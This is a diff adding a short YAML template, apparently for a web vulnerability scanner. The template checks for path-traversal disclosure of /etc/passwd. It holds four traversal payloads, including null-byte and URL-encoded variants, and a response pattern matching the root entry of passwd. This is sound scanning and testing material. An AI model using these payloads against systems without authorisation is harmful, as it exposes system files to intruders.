@@ -1,0 +1,18 @@
+template:
+   name: path-traversal
+   severity: high
+   author: zoidsec
+   description: Path Traversal etc/passwd Disclosure
+
+request:
+   payloads: 
+      - "../../../../../../etc/passwd"
+      - "../../../../../../etc/passwd%00"
+      - "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+   paths: false
+response:
+   statusCode: 200
+   patterns: 
+      - "root:x:0:0:root"
